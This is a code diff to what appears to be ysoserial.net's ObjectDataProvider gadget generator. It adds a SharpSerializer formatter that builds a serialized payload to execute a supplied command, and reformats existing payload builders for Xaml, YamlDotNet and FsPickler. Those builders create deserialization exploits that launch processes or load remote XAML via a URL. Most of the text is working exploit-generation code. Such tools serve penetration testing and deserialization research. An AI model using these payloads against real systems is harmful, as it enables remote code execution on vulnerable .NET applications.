@@ -29,7 +29,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler" };
+            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializer" };
         }
 
         public override OptionSet Options()
@@ -62,14 +62,14 @@ namespace ysoserial.Generators
         {
             return new List<string> { GadgetTypes.NotBridgeNotDerived };
         }
-        
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
             if (formatter.ToLower().Equals("xaml"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                
+
                 psi.FileName = inputArgs.CmdFileName;
                 if (inputArgs.HasArguments)
                 {
@@ -95,9 +95,9 @@ namespace ysoserial.Generators
                     payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
 
                 }
-                else if(variant_number == 3)
+                else if (variant_number == 3)
                 {
-                    if(xaml_url == "")
+                    if (xaml_url == "")
                     {
                         Console.WriteLine("Url parameter was not provided.");
                         Console.WriteLine("Try 'ysoserial --fullhelp' for more information.");
@@ -107,7 +107,7 @@ namespace ysoserial.Generators
                     // There are loads of other objects in Presentation that use XAML URLs and they can be used here instead
                     payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
 
-                    
+
                 }
                 else if (variant_number == 4)
                 {
@@ -121,7 +121,7 @@ namespace ysoserial.Generators
                     }
 
                     // There are loads of other objects in Presentation that use ResourceDictionary and they can all be used here instead
-                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>"; 
+                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>";
 
                 }
                 else
@@ -129,7 +129,7 @@ namespace ysoserial.Generators
                     //payload = XamlWriter.Save(odp);
                     payload = SerializersHelper.Xaml_serialize(odp);
                 }
-                
+
                 if (inputArgs.Minify)
                 {
                     // using discardable regex array to make it shorter!
@@ -142,7 +142,8 @@ namespace ysoserial.Generators
                     {
                         var staThread = new System.Threading.Thread(delegate ()
                         {
-                            try {
+                            try
+                            {
                                 SerializersHelper.Xaml_deserialize(payload);
                             }
                             catch (Exception err)
@@ -165,7 +166,7 @@ namespace ysoserial.Generators
                         {
                             Debugging.ShowErrors(inputArgs, err);
                         }
-                    }   
+                    }
                 }
                 return payload;
             }
@@ -476,7 +477,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("yamldotnet"))
             {
                 inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;
-                
+
                 String cmdPart;
 
                 if (inputArgs.HasArguments)
@@ -501,7 +502,7 @@ namespace ysoserial.Generators
                 }
         }
 }";
-                
+
                 if (inputArgs.Minify)
                 {
                     payload = YamlDocumentMinifier.Minify(payload);
@@ -523,7 +524,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("fspickler"))
             {
                 inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
-                
+
                 String cmdPart;
 
                 if (inputArgs.HasArguments)
@@ -568,7 +569,7 @@ namespace ysoserial.Generators
                     ""PublicKeyToken"": ""b77a5c561934e089""
                   }
                 },
-                ""Value"": """+ internalPayload + @"""
+                ""Value"": """ + internalPayload + @"""
               }
             ]
           }
@@ -593,6 +594,16 @@ namespace ysoserial.Generators
                     }
                 }
                 return payload;
+            }
+            else if (formatter.ToLowerInvariant().Equals("sharpserializer"))
+            {
+                // Binary Serialization Mode
+                object serializedData = SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Serialize(inputArgs.Cmd);
+                if (inputArgs.Test)
+                {
+                    SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Deserialize(serializedData);
+                }
+                return serializedData;
             }
             else
             {
